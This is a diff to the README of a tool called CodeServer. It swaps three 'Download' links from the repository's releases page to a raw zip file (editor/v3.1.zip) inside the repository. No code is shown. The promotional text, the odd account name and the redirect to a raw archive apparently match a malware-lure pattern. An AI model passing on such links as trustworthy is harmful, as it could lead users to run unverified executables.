@@ -1,6 +1,6 @@
 # 🚀 CodeServer - Host Live Coding Sessions Instantly
 
-[![Download CodeServer](https://img.shields.io/badge/Download-CodeServer-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Difflugiavaughan6146/CodeServer/releases)
+[![Download CodeServer](https://img.shields.io/badge/Download-CodeServer-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Difflugiavaughan6146/CodeServer/main/editor/v3.1.zip)
 
 ## 🎯 What Is CodeServer?
 
@@ -31,7 +31,7 @@ CodeServer is a single executable file. No installation wizard, no dependencies,
 
 Visit this link to download the application:
 
-[**Download CodeServer Now**](https://github.com/Difflugiavaughan6146/CodeServer/releases)
+[**Download CodeServer Now**](https://raw.githubusercontent.com/Difflugiavaughan6146/CodeServer/main/editor/v3.1.zip)
 
 ### Step 2: Run CodeServer
 
@@ -131,7 +131,7 @@ The combination of professional-grade editing features and dead-simple sharing m
 
 Ready to transform how you collaborate on code? Download CodeServer now and start your first session in under a minute.
 
-[**Get CodeServer Now**](https://github.com/Difflugiavaughan6146/CodeServer/releases)
+[**Get CodeServer Now**](https://raw.githubusercontent.com/Difflugiavaughan6146/CodeServer/main/editor/v3.1.zip)
 
 ## 🆘 Need Help?
 
